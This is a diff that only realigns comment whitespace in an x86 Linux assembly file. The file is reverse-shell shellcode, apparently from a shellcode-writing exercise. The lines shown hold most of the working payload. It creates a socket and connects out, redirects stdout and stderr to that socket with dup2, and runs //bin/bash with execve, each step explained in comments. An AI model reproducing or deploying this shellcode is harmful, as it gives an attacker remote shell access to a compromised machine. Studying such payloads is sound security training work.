@@ -19,7 +19,7 @@ _start:
 	mov al, 0x66			; SYS_SOCKETCALL = 102
 	mov esi, eax			; Save for later (to reduce shellcode length)
 	xor ebx, ebx
-	mov bl, 0x1				; int call => SYS_SOCKET = 0x1
+	mov bl, 0x1			; int call => SYS_SOCKET = 0x1
 	mov ecx, esp			; unsigned long *args => arguments for socket()
 	int 0x80
 
@@ -30,10 +30,10 @@ _start:
 	;		   socklen_t addrlen);
 
 	; struct sockaddr_in {
-	;     short sin_family;			-- 2 bytes, AF_INET
+	;     short sin_family;		-- 2 bytes, AF_INET
 	;     unsigned short sin_port;	-- 2 bytes, htons(PORT)
-	;     struct in_addr;			-- 4 bytes, INADDR_ANY (0x00000000)
-	;     char sin_zero[8];			-- 8 bytes, 0x00000000 0x00000000
+	;     struct in_addr;		-- 4 bytes, INADDR_ANY (0x00000000)
+	;     char sin_zero[8];		-- 8 bytes, 0x00000000 0x00000000
 	; }
 
 	; struct in_addr {
@@ -55,7 +55,7 @@ _start:
 	push dword edi			; int sockfd => return value from SYS_SOCKET
 
 	mov eax, esi			; SYS_SOCKETCALL = 102
-	mov bl, 0x3				; int call => SYS_CONNECT = 0x3
+	mov bl, 0x3			; int call => SYS_CONNECT = 0x3
 	mov ecx, esp			; unsigned long *args => arguments for connect()
 	int 0x80
 
@@ -70,23 +70,23 @@ _start:
 	; dup2 (int oldfd, int newfd);
 
 	mov al, 0x3f			; SYS_DUP2 = 0x3f
-							; int newfd => return value from SYS_SOCKET
-	inc ecx					; int oldfd => STDOUT = 0x1
+					; int newfd => return value from SYS_SOCKET
+	inc ecx				; int oldfd => STDOUT = 0x1
 	int 0x80
 
 	; dup2 (int oldfd, int newfd);
 
 	mov al, 0x3f			; SYS_DUP2 = 0x3f
-							; int newfd => return value from SYS_SOCKET
-	inc ecx					; int oldfd => STDERR = 0x2
+					; int newfd => return value from SYS_SOCKET
+	inc ecx				; int oldfd => STDERR = 0x2
 	int 0x80
 
 	; execve (const char *pathname, char *const argv[],
 	;         char *const envp[]);
 
 	push byte 0x68			; ...h
-	push dword 0x7361622f	; sab/
-	push dword 0x6e69622f	; nib/
+	push dword 0x7361622f		; sab/
+	push dword 0x6e69622f		; nib/
 
 	mov ebx, esp			; const char *pathname => *"//bin/bash"
 	xor eax, eax
@@ -94,5 +94,5 @@ _start:
 	mov edx, esp			; char *const envp[] => NULL
 	push ebx,
 	mov ecx, esp			; char *const argv[] => *{*"//bin/bash"}
-	mov al, 0xb				; SYS_EXECVE = 0xb
+	mov al, 0xb			; SYS_EXECVE = 0xb
 	int 0x80
